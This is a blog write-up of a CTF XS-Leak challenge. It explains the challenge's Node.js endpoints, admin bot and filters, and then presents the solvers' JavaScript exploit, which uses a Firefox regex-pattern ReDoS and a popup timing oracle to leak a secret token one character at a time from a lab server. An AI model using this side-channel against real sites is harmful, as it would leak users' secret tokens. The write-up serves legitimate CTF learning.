+<!-- raw HTML omitted -->
+
+<h2 id="overview">
+  <a class="full-clickable-heading" href="#overview">
+    Overview
+  </a>
+</h2>
+<p>As the name suggests, this is an 
+
+  <a href="https://xsleaks.dev/" rel="noopener">XS-Leak</a>
+
+ challenge. We&rsquo;re given the source code and there are three endpoints.</p>
+<p><code>/save-flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// For the admin bot
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/save-flag&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">tokens</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">flag</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">tokens</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span> <span class="c1">// expired
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="mi">120_000</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">).</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&#34;TOKEN&#34;</span><span class="p">,</span> <span class="nx">token</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Saved&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Generates a random token and saves the flag. The token is deleted after 120 seconds.</p>
+<p><code>/get</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// If you steal a token, use it :)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/get&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">tokens</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="o">??</span> <span class="s2">&#34;Not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Retrieves the flag given its token.</p>
+<p><code>/</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">html</span> <span class="o">??</span> <span class="nx">defaultHtml</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">html</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/[^\x20-\x7e\r\n]/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">html</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;??&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/meta|link|src|data|href|svg|:|%|&amp;|\\|\/\//i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">html</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;???&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s2">&#34;html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;default-src &#39;none&#39;; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&#34;{{TOKEN}}&#34;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">TOKEN</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>This endpoint lets us render arbitrary HTML. If we put <code>{{TOKEN}}</code> inside our HTML, it will be replaced with the <code>TOKEN</code> cookie.</p>
+<p>Also, a new token is generated every time a URL is reported.</p>
+<p><code>bot.js</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">addCookies</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;FLAG&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="o">:</span> <span class="nx">FLAG</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="nx">APP_URL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">page1</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page1</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">APP_URL</span> <span class="o">+</span> <span class="s2">&#34;/save-flag&#34;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">3_000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">2_000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page1</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">page2</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page2</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">5_000</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">60_000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page2</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span></span></code></pre></div><p>The goal is:</p>
+<ul>
+<li>Steal the bot token within 60 seconds.</li>
+<li>Use that token to retrieve the flag by making a request to <code>/get</code>.</li>
+</ul>
+<p>However, we have a few limitations:</p>
+<ul>
+<li>The HTML should be less than 1024 characters.</li>
+<li>We can&rsquo;t use any characters besides <code>^\x20-\x7e\r\n</code>.</li>
+<li>We can&rsquo;t use the following words: <code>meta</code>, <code>link</code>, <code>src</code>, <code>data</code>, <code>href</code>, <code>svg</code>.</li>
+<li>We can&rsquo;t use the following characters: <code>:%&amp;\</code>.</li>
+</ul>
+<p>Furthermore, there&rsquo;s a strict 
+
+  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="noopener">CSP</a>
+
+ which prevents us from using other techniques to leak the token.</p>
+<style type="text/css">
+     
+    .notice {
+        --title-color: #fff;
+        --title-background-color: #6be;
+        --content-color: #444;
+        --content-background-color: #e7f2fa;
+    }
+
+    .notice.info {
+        --title-background-color: #fb7;
+        --content-background-color: #fec;
+    }
+
+    .notice.tip {
+        --title-background-color: #5a5;
+        --content-background-color: #efe;
+    }
+
+    .notice.warning {
+        --title-background-color: #c33;
+        --content-background-color: #fee;
+    }
+
+     
+    @media (prefers-color-scheme:dark) {
+        .notice {
+            --title-color: #fff;
+            --title-background-color: #069;
+            --content-color: #ddd;
+            --content-background-color: #023;
+        }
+
+        .notice.info {
+            --title-background-color: #a50;
+            --content-background-color: #420;
+        }
+
+        .notice.tip {
+            --title-background-color: #363;
+            --content-background-color: #121;
+        }
+
+        .notice.warning {
+            --title-background-color: #800;
+            --content-background-color: #400;
+        }
+    }
+
+    body.dark .notice {
+        --title-color: #fff;
+        --title-background-color: #069;
+        --content-color: #ddd;
+        --content-background-color: #023;
+    }
+
+    body.dark .notice.info {
+        --title-background-color: #a50;
+        --content-background-color: #420;
+    }
+
+    body.dark .notice.tip {
+        --title-background-color: #363;
+        --content-background-color: #121;
+    }
+
+    body.dark .notice.warning {
+        --title-background-color: #800;
+        --content-background-color: #400;
+    }
+
+     
+    .notice {
+        padding: 18px;
+        line-height: 24px;
+        margin-bottom: 24px;
+        border-radius: 4px;
+        color: var(--content-color);
+        background: var(--content-background-color);
+    }
+
+    .notice p:last-child {
+        margin-bottom: 0
+    }
+
+     
+    .notice-title {
+        margin: -18px -18px 12px;
+        padding: 4px 18px;
+        border-radius: 4px 4px 0 0;
+        font-weight: 700;
+        color: var(--title-color);
+        background: var(--title-background-color);
+    }
+
+     
+    .icon-notice {
+        display: inline-flex;
+        align-self: center;
+        margin-right: 8px;
+    }
+
+    .icon-notice img,
+    .icon-notice svg {
+        height: 1em;
+        width: 1em;
+        fill: currentColor;
+    }
+
+    .icon-notice img,
+    .icon-notice.baseline svg {
+        top: .125em;
+        position: relative;
+    }
+</style><div class="notice note" >
+    <p class="notice-title">
+        <span class="icon-notice baseline">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
+  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
+</svg>
+
+        </span>Note</p><p>The bot uses Firefox!</p></div>
+
+
+<h2 id="solution">
+  <a class="full-clickable-heading" href="#solution">
+    Solution
+  </a>
+</h2>
+<p>The first thing that came to our mind was searching for weird behaviors in Firefox, hoping to find something useful. And we did:</p>
+<p><img src="/images/image-fireleak.png" loading="lazy" decoding="async" alt="alt text"></p>
+<p><strong>Note:</strong> If you don&rsquo;t know what a ReDoS is, check out 
+
+  <a href="https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/" rel="noopener">this article!</a>
+
+.</p>
+<p>We used the following regex and input:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">regex</span> <span class="o">=</span> <span class="s2">&#34;^&#34;</span> <span class="o">+</span> <span class="nx">tobrute</span> <span class="o">+</span> <span class="s2">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">input</span> <span class="o">=</span> <span class="sb">`{{TOKEN}}</span><span class="si">${</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">count</span><span class="p">)</span><span class="si">}</span><span class="sb">!`</span><span class="p">;</span>
+</span></span></code></pre></div><p>So if our token is <code>deadbeef</code>, our HTML element would be:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;deadbeefaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#34;</span> <span class="na">pattern</span><span class="o">=</span><span class="s">&#34;^d(([a-f0-9]+.)[a-f0-9])+$&#34;</span> <span class="p">/&gt;</span>
+</span></span></code></pre></div><p>By doing so, if the first part of the pattern (<code>^d</code>) is matched, the regex will cause a ReDoS and we would know that the first character of the token is <code>d</code>.</p>
+<p>
+
+  <a href="https://blog.robertelder.org/regular-expression-visualizer/?the_regex=%5Ed%28%28%5Ba-f0-9%5D%2B.%29%5Ba-f0-9%5D%29%2B%24&amp;the_subject=deadaaaaaa!" rel="noopener">Here</a>
+
+ you can see why it happens!</p>
+<p>Now we need a way to detect the ReDoS.</p>
+<p>We noticed that if we try to change the location of the window during the ReDoS (to <code>about:blank</code>), Firefox will go to that location only after finishing the validation process.</p>
+<p>So, we can detect how much time it takes to let that happen by continuously checking if we can retrieve the value of <code>window.opener</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">time</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">popup</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="s2">&#34;palle&#34;</span><span class="p">,</span> <span class="s2">&#34;width=200,height=100&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">oracle</span><span class="p">(</span><span class="nx">tobrute</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">final_pattern</span> <span class="o">=</span> <span class="s2">&#34;^&#34;</span> <span class="o">+</span> <span class="nx">tobrute</span> <span class="o">+</span> <span class="s2">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;PATTERN&#34;</span><span class="p">,</span> <span class="nx">final_pattern</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">30</span> <span class="o">+</span> <span class="nx">tobrute</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tokstr</span> <span class="o">=</span> <span class="s2">&#34;{{TOKEN}}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">html</span> <span class="o">=</span> <span class="sb">`&lt;input value=&#34;{{TOKEN}}</span><span class="si">${</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">count</span><span class="p">)</span><span class="si">}</span><span class="sb">!&#34; pattern=&#34;</span><span class="si">${</span><span class="nx">final_pattern</span><span class="si">}</span><span class="sb">&#34; /&gt;`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">popup</span><span class="p">(</span><span class="s2">&#34;http://web:3000/?html=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">html</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">w</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;about:blank&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">interval</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">w</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">interval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resolve</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Do nothing, just wait for the next interval
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>We tried to execute this locally and&hellip; it worked!</p>
+<p><img src="/images/image-fireleak1.png" loading="lazy" decoding="async" alt="alt text"></p>
+<p>So it should also work on the remote server, right?
+Unfortunately, no. Timing attacks using ReDoS are inherently unstable, as they depend on numerous factors. While we were able to leak the entire token locally in just 30 to 40 seconds, on the remote server, we were only getting garbage.</p>
+<p>To address this, we had to do a bit of fine-tuning by re-using the same window without closing it, adjusting the sleep durations, and the length of our input values&hellip; and still, we were not able to leak the token but at least we were leaking a part of it.</p>
+<p>At some point, we decided to brute-force the last two characters because we wasted more than 3 hours trying to make this exploit stable. And it worked!</p>
+<p><img src="/images/image-fireleak2.png" loading="lazy" decoding="async" alt="alt text"></p>
+<p>We were the only team that managed to solve this challenge.</p>
+<p><img src="/images/image-fireleak3.png" loading="lazy" decoding="async" alt="alt text"></p>
+
+<h2 id="conclusions">
+  <a class="full-clickable-heading" href="#conclusions">
+    Conclusions
+  </a>
+</h2>
+<p>After reading the 
+
+  <a href="https://blog.arkark.dev/2024/12/30/asisctf-finals/" rel="noopener">author&rsquo;s writeup</a>
+
+, we saw that he used a slightly different approach by doing frame counting, and his exploit leaks the token in about 30 seconds!</p>
+<p>Anyway, thanks for the great CTF, we had a lot of fun!</p>
+</div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/salvatore-abello">Github</a>
+      
+         | 
+        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
+      
+         | 
+        <a href="https://x.com/salvatoreabello">X</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2025. All rights deserved.
+    <a href="http://localhost:1313/"><strong>Salvatore Abello</strong></a>.
+  </p>
+  <hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href="/index.xml"><b>RSS</b></a>
+</footer>
+
+    </div>
+  </body>
+</html>
